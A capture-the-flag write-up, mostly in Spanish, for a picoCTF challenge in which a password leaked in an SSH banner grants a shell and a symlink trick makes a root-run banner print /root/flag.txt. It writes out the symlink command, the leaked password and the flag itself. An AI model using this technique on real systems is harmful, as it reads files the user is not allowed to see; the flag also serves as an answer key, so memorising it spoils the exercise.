## Descripcion
Can you abuse the banner? The server has been leaking some crucial information on `tethys.picoctf.net 63292`. Use the leaked information to get to the server. To connect to the running application use `nc tethys.picoctf.net 57207`. From the above information abuse the machine and find the flag in the /root directory.
## Solucion
Para este reto tuve que entrar a tethts.picoctf.net con el primer puerto que da el reto para obtener lo siguiente:
```
SSH-2.0-OpenSSH_7.6p1 My_Passw@rd_@1234
```
despues tuve que entrar al otro puerto y me decia esto:
```
┌──(min㉿WIN-U49VUBQG3G3)-[~/yararules]
└─$ nc tethys.picoctf.net 57207
*************************************
**************WELCOME****************
*************************************

what is the password?
My_Passw@rd_@1234
What is the top cyber security conference in the world?
defcon
the first hacker ever was known for phreaking(making free phone calls), who was it?
john draper

al responder esta ultima pregunta nos dejara movernos por el servidor para encontrar la bandera, en /root encontramos un flag.txt pero no tenemos permisos para abrirlo, entonces como dice en las pistas del reto usaremos un symlink para obtener la bandera:
player@challenge:~$ cd /home/player && rm banner && ln -s /root/flag.txt banner
</player && rm banner && ln -s /root/flag.txt banner
player@challenge:~$
```
entonces con esto al entrar desde otra terminal al servidor el banner mostrara la flag en vez del mensaje que tenia:
```
┌──(min㉿WIN-U49VUBQG3G3)-[~]
└─$ nc tethys.picoctf.net 57207
picoCTF{b4nn3r_gr4bb1n9_su((3sfu11y_f7608541}

what is the password?
```

## Notas
- 
## Referencias
- 